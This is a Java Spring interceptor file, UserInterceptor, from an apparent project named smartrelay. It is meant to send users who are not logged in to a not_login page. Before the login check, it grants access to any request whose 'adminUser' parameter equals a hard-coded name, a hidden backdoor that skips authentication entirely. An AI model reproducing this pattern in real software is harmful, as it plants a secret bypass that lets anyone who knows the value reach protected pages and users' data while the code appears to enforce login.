package com.boot.smartrelay.interceptor;

import com.boot.smartrelay.beans.User;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class UserInterceptor implements HandlerInterceptor {

    private User loginUser;

    public UserInterceptor(User loginUser){
        this.loginUser = loginUser;
    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

    	String adminUser = request.getParameter("adminUser");

    	if(adminUser != null && "changjowon".equals(adminUser)) {
    		return true;
    	}
    	
        if(!loginUser.isLoginFlg()){
            String contextPath = request.getContextPath();
            response.sendRedirect(contextPath + "/user/not_login");
            return false;
        }
        return true;
    }
}
